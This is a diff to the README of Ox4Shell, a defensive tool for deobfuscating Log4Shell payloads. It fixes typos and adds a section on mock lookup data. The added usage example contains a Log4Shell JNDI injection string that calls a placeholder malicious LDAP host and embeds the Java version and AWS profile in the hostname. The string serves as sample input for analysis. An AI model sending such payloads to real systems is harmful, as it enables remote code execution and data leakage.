@@ -3,10 +3,10 @@ Deobfuscate Log4Shell payloads with ease.
 
 
 ## Description
-Since the release of the Log4Shell vulnerability (CVE-...), many tools were created to obfuscate Log4Shell payloads,
-making the lifes of security engineers a nightmare.
+Since the release of the Log4Shell vulnerability (CVE-2021-44228), many tools were created to obfuscate Log4Shell payloads,
+making the lives of security engineers a nightmare.
 
-This tool intends to aid security enginners to unravel the true contents of obfuscated Log4Shell payloads.
+This tool intends to unravel the true contents of obfuscated Log4Shell payloads.
 
 For example, consider the following obfuscated payload:
 ```text
@@ -33,7 +33,7 @@ usage: ox4shell [-h] [-d] [-m MOCK] (-p PAYLOAD | -f FILE)
   \____//_/\_\  |_||_____/|_| |_|\___|_|_|
 
 Ox4Shell - Deobfuscate Log4Shell payloads with ease.
-    Created by Oxeye.io
+    Created by oxeye.io
 
 optional arguments:
   -h, --help            show this help message and exit
@@ -46,10 +46,14 @@ optional arguments:
 
 
 ## Mock Data
+The Log4j library has a few unique lookup functions, which allow users to look up environment variables, runtime 
+information on the Java process, and so forth. This capability grants threat actors the ability to probe for specific 
+information that can uniquely identify the compromised machine they targeted.
+
 Ox4Shell uses the `mock.json` file to insert common values into certain lookup function, for example,
 if the payload contains the value `${env:HOME}`, we can replace it with a custom mock value.
 
-For example, the default set of mock data provided is:
+The default set of mock data provided is:
 ```json
 {
     "hostname": "ip-172-30-20-110",
@@ -70,10 +74,16 @@ For example, the default set of mock data provided is:
 }
 ```
 
+As an example, we can deobfuscate the following payload using the Ox4Shell's mocking capability:
+```bash
+~/Ox4Shell >> python ox4shell.py -p "\${jndi:ldap://\${sys:java.version}.\${env:AWS_PROFILE}.malicious.server/a}"  
+${jndi:ldap://16.0.2.staging.malicious.server/a}
+```
+
 ## Authors
 - [Daniel Abeles](https://twitter.com/Daniel_Abeles)
 - [Ron Vider](https://twitter.com/ron_vider)
 
 
 ## License
-The source code for the site is licensed under the MIT license, which you can find in the LICENSE file.
+The source code for the project is licensed under the MIT license, which you can find in the LICENSE file.
